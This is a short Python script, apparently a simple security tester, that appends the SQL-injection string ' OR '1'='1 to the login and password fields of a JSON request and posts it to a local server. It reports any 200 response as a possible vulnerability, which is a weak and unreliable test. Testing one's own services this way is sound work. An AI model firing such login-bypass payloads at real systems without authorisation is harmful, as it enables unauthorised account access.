import requests
import json

def test_json_injection(url, param_dict):
    # JSON injection payload
    payload = "' OR '1'='1"

    for param in param_dict:
        # Copy the original parameters
        injected_param = param_dict.copy()
        # Inject the payload
        injected_param[param] += payload
        try:
            # Send a POST request with the JSON data
            response = requests.post(url, json=injected_param)
            if response.status_code == 200:
                print(f"Potential JSON Injection vulnerability detected in parameter: {param}")
        except requests.exceptions.RequestException as e:
            print(f"An error occurred: {e}")

# Replace 'http://yourserver.com/api' with your server's URL
# Replace 'field1' and 'field2' with your parameter names
test_json_injection('http://127.0.0.1:3000', {'login_field': '', 'password_field': ''})